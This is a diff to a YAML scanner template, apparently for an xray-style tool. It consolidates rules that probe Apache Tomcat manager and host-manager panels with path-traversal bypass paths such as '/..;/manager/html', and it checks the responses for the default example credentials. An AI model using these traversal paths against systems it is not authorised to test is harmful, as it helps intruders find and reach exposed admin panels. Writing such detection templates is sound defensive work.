@@ -15,44 +15,34 @@ info:
 set:
   randstr: randomLowercase(10)
 rules:
-  r00:
-    request:
-      method: GET
-      path: /manager/html
-    expression: (response.status == 401 || response.status == 200) && (response.body.bcontains(b'Apache Tomcat') || response.body.bcontains(b'Tomcat Manager'))
-  r01:
-    request:
-      method: GET
-      path: /host-manager/html
-    expression: (response.status == 401 || response.status == 200) && (response.body.bcontains(b'Apache Tomcat') || response.body.bcontains(b'Tomcat Manager'))
   r0:
+    stop_if_match: true
+    brute:
+      mode: sniper
+      commit: winner
+      continue: false
+      p:
+        - /manager/html
+        - /host-manager/html
     request:
       method: GET
-      path: "/..;/manager/html"
-    expression: response.status == 403 && response.body.bcontains(b'username="tomcat" password="s3cret"') && response.body.bcontains(b'manager-gui')
+      path: "{{p}}"
+    expression: (response.status == 401 || response.status == 200) && (response.body.bcontains(b'Apache Tomcat') || response.body.bcontains(b'Tomcat Manager'))
   r1:
+    stop_if_match: true
+    brute:
+      mode: sniper
+      commit: winner
+      continue: false
+      p:
+        - "/..;/manager/html"
+        - "/..;/..;/manager/html;/"
+        - "/..;/host-manager/html"
+        - "/..;/..;/host-manager/html;/"
+        - "/{{randstr}}/..;/manager/html"
+        - "/{{randstr}}/..;/host-manager/html"
     request:
       method: GET
-      path: "/..;/..;/manager/html;/"
+      path: "{{p}}"
     expression: response.status == 403 && response.body.bcontains(b'username="tomcat" password="s3cret"') && response.body.bcontains(b'manager-gui')
-  r2:
-    request:
-      method: GET
-      path: "/..;/host-manager/html"
-    expression: response.status == 403 && response.body.bcontains(b'username="tomcat" password="s3cret"') && response.body.bcontains(b'manager-gui')
-  r3:
-    request:
-      method: GET
-      path: "/..;/..;/host-manager/html;/"
-    expression: response.status == 403 && response.body.bcontains(b'username="tomcat" password="s3cret"') && response.body.bcontains(b'manager-gui')
-  r4:
-    request:
-      method: GET
-      path: "/{{randstr}}/..;/manager/html"
-    expression: response.status == 403 && response.body.bcontains(b'username="tomcat" password="s3cret"') && response.body.bcontains(b'manager-gui')
-  r5:
-    request:
-      method: GET
-      path: "/{{randstr}}/..;/host-manager/html"
-    expression: response.status == 403 && response.body.bcontains(b'username="tomcat" password="s3cret"') && response.body.bcontains(b'manager-gui')
-expression: r00() || r01() || r0() || r1() || r2() || r3() || r4() || r5()
+expression: r0() || r1()
